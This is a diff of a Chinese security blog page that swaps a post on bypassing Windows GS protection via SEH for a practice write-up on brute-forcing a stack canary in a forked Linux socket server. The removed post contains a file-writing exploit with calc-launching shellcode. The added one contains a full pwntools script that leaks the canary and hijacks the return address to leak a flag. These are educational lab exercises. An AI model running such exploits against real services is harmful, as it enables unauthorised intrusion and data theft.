@@ -6,20 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://niwbie.github.io">
-  <title>PWN练习（绕过GS保护） | isee&#39;blog</title>
+  <title>PWN练习之爆破绕过canary | isee&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="程序：test">
+  <meta name="description" content="test使用方法：在当前目录下创建一个名为“flag”的文件，里面随便写一个密码，运行后即可成为靶机。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PWN练习（绕过GS保护）">
-<meta property="og:url" content="https://niwbie.github.io/2016/03/29/PWN练习(绕过GS保护)/index.html">
+<meta property="og:title" content="PWN练习之爆破绕过canary">
+<meta property="og:url" content="https://niwbie.github.io/2016/04/02/PWN练习之爆破绕过canary/index.html">
 <meta property="og:site_name" content="isee'blog">
-<meta property="og:description" content="程序：test">
-<meta property="og:image" content="https://niwbie.github.io/image/PWN练习_绕过GS保护/1.png">
-<meta property="og:updated_time" content="2017-03-29T13:49:13.316Z">
+<meta property="og:description" content="test使用方法：在当前目录下创建一个名为“flag”的文件，里面随便写一个密码，运行后即可成为靶机。">
+<meta property="og:image" content="https://niwbie.github.io/image/PWN练习之爆破绕过canary/1.png">
+<meta property="og:image" content="https://niwbie.github.io/image/PWN练习之爆破绕过canary/2.png">
+<meta property="og:image" content="https://niwbie.github.io/image/PWN练习之爆破绕过canary/3.png">
+<meta property="og:image" content="https://niwbie.github.io/image/PWN练习之爆破绕过canary/4.png">
+<meta property="og:image" content="https://niwbie.github.io/image/PWN练习之爆破绕过canary/5.png">
+<meta property="og:updated_time" content="2017-04-01T10:04:59.395Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PWN练习（绕过GS保护）">
-<meta name="twitter:description" content="程序：test">
-<meta name="twitter:image" content="https://niwbie.github.io/image/PWN练习_绕过GS保护/1.png">
+<meta name="twitter:title" content="PWN练习之爆破绕过canary">
+<meta name="twitter:description" content="test使用方法：在当前目录下创建一个名为“flag”的文件，里面随便写一个密码，运行后即可成为靶机。">
+<meta name="twitter:image" content="https://niwbie.github.io/image/PWN练习之爆破绕过canary/1.png">
   
     <link rel="alternative" href="/atom.xml" title="isee&#39;blog" type="application/atom+xml">
   
@@ -135,7 +139,7 @@
 </nav>
 
       <div class="body-wrap">
-        <article id="post-PWN练习(绕过GS保护)" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-PWN练习之爆破绕过canary" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <input type="hidden" class="isFancy" />
@@ -145,7 +149,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      PWN练习（绕过GS保护）
+      PWN练习之爆破绕过canary
     </h1>
   
       
@@ -153,23 +157,27 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>程序：<a href="/image/PWN练习_绕过GS保护/test_x86_wo_safeseh_dep.exe">test</a><br><a id="more"></a></p>
-<p><img src="/image/PWN练习_绕过GS保护/1.png" alt="这里写图片描述"><br>漏洞很简单，就是逐字节读取文件，但是没有限制长度，导致栈溢出。<br>不过开启了GS保护（类似canary），所以如果直接用栈溢出覆盖返回地址，则会出错。所以这里利用SEH来绕过GS保护。</p>
-<p><a href="/2016/03/29/在栈中利用SEH/index.html">原理在这</a></p>
-<p>直接上python写文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">jmp_addr = &apos;\xeb\x06\x90\x90&apos;</div><div class="line">ppr_addr = &apos;\x31\x19\x0f\x01&apos;</div><div class="line"></div><div class="line">shellcode=[0xeb,0x67,0x55,0x8b,0xec,0x64,0xa1,0x30,0x0,0x0,0x0,0x8b,0x40,0xc,0x8b,0x40,0x14,0x8b,0x0,0x8b,0x70,0x28,0x80,0x7e,0xc,0x33,0x75,0xf5,0x8b,0x40,0x10,0x8b,0xf8,0x3,0x7f,0x3c,0x8b,0x7f,0x78,0x3,0xf8,0x8b,0xdf,0x8b,0x7b,0x20,0x3,0xf8,0x33,0xc9,0x8b,0x34,0x8f,0x3,0xf0,0x41,0x8b,0x54,0x24,0x8,0x39,0x16,0x75,0xf2,0x8b,0x54,0x24,0xc,0x39,0x56,0x4,0x75,0xe9,0x8b,0x7b,0x24,0x3,0xf8,0x8b,0xc,0x4f,0x81,0xe1,0xff,0xff,0x0,0x0,0x8b,0x7b,0x1c,0x3,0xf8,0x49,0xc1,0xe1,0x2,0x8b,0x3c,0xf,0x3,0xc7,0x5d,0xc2,0x8,0x0,0x68,0x78,0x65,0x63,0x0,0x68,0x57,0x69,0x6e,0x45,0xe8,0x8a,0xff,0xff,0xff,0x50,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0xe8,0x7a,0xff,0xff,0xff,0x50,0x6a,0x0,0x68,0x2e,0x65,0x78,0x65,0x68,0x63,0x61,0x6c,0x63,0x6a,0x5,0x8d,0x4c,0x24,0x4,0x51,0x8b,0x44,0x24,0x18,0xff,0xd0,0x83,0xc4,0xc,0x33,0xc0,0x50,0x8b,0x44,0x24,0x4,0xff,0xd0]</div><div class="line"></div><div class="line">fr = open(&apos;msg.dat&apos;,&apos;wb+&apos;)</div><div class="line"></div><div class="line">payload = &apos;A&apos;*84 + jmp_addr + ppr_addr</div><div class="line">fr.write(payload)</div><div class="line">for s in range(len(shellcode)):</div><div class="line">	fr.write(chr(shellcode[s]))</div><div class="line">over = &apos;c&apos;*(20000-len(payload))</div><div class="line">fr.write(over)</div></pre></td></tr></table></figure>
+        <p><a href="/image/PWN练习之爆破绕过canary/test.zip">test</a><br>使用方法：在当前目录下创建一个名为“flag”的文件，里面随便写一个密码，运行后即可成为靶机。</p>
+<a id="more"></a>
+<p>这是一个64位的elf程序，使用socket通信，每当接收到一个连接就调用fork函数创建一个子进程与之通信。在函数sub_400b76里打开“flag”文件并读取其中的密码，放到地址0x602160上。<br><img src="/image/PWN练习之爆破绕过canary/1.png" alt="这里写图片描述"></p>
+<p>在后面的sub_400BE9中发现了一个缓冲区溢出漏洞。因此思路就是利用缓冲区溢出漏洞，改变函数的返回地址，使之跳转到函数0x400bc6，这里可以send该flag的值。<br><img src="/image/PWN练习之爆破绕过canary/2.png" alt="这里写图片描述"><br><img src="/image/PWN练习之爆破绕过canary/3.png" alt="这里写图片描述"></p>
+<p>在gdb中，使用checksec命令，发现该程序开启了canary保护：<br><img src="/image/PWN练习之爆破绕过canary/4.png" alt="这里写图片描述"></p>
+<p>因此这题的思路就是使用爆破来确定该canary的值，即从0-255发送，只要能收到返回的字符，说明程序没有退出，这样可以一个一个字节地确定该canary的值。</p>
+<p>从IDA可以看出，s和v3（canary）的地址相差了0x78-0x10 = 0x68即104个字节。所以在构造104个无用字节之后，后面开始爆破即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">canary = &apos;&apos;</div><div class="line">ip = &quot;127.0.0.1&quot;</div><div class="line">port = 5555</div><div class="line"></div><div class="line">for i in range(8):</div><div class="line">	for c in range(256):</div><div class="line">		io  = remote(ip, port)</div><div class="line">		#io  = remote(ip, port)</div><div class="line">		io.recvuntil(&quot;Welcome!\n&quot;)</div><div class="line">		payload = &apos;A&apos;*104 + canary + chr(c)</div><div class="line">		io.send(payload)</div><div class="line">		try:</div><div class="line">			data = io.recvline()</div><div class="line">			#print data</div><div class="line">			if &quot;Message received&quot; in data:</div><div class="line">				canary += chr(c)</div><div class="line">				io.close()</div><div class="line">		except:</div><div class="line">			io.close()</div><div class="line">			continue</div><div class="line">		break</div><div class="line"></div><div class="line">print &apos;canary = &apos; + canary.encode(&apos;hex&apos;)</div><div class="line"></div><div class="line">io  = remote(ip, port)</div><div class="line">payload1 = &apos;A&apos;*104 + canary + p64(0x602160) + p64(0x400bc6)</div><div class="line">io.recvuntil(&apos;Welcome!&apos;)</div><div class="line">io.send(payload1)</div><div class="line">io.recv()</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
+<p><img src="/image/PWN练习之爆破绕过canary/5.png" alt="这里写图片描述"><br>结果：密码为”papap!”</p>
 
       
     </div>
     <div class="article-info article-info-index">
       
-      <a href="/2016/03/29/PWN练习(绕过GS保护)/" class="archive-article-date">
-  	<time datetime="2016-03-29T13:28:12.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-03-29</time>
+      <a href="/2016/04/02/PWN练习之爆破绕过canary/" class="archive-article-date">
+  	<time datetime="2016-04-02T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-04-02</time>
 </a>
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
 	</div>
 
       
@@ -182,18 +190,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2016/03/29/在栈中利用SEH/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2016/05/11/简单的分配栈帧及溢出修改相邻变量/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          在栈中利用SEH
+          简单的分配栈帧及溢出修改相邻变量
         
       </div>
     </a>
   
   
-    <a href="/2016/03/22/Linux下的缓冲区溢出攻击(三)/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Linux下的缓冲区溢出攻击(三)</div>
+    <a href="/2016/04/01/Linux安全之canary/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Linux安全之canary</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -227,7 +235,7 @@
 
 <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="PWN练习(绕过GS保护)" data-title="PWN练习（绕过GS保护）" data-url="https://niwbie.github.io/2016/03/29/PWN练习(绕过GS保护)/"></div>
+	<div class="ds-thread" data-thread-key="PWN练习之爆破绕过canary" data-title="PWN练习之爆破绕过canary" data-url="https://niwbie.github.io/2016/04/02/PWN练习之爆破绕过canary/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
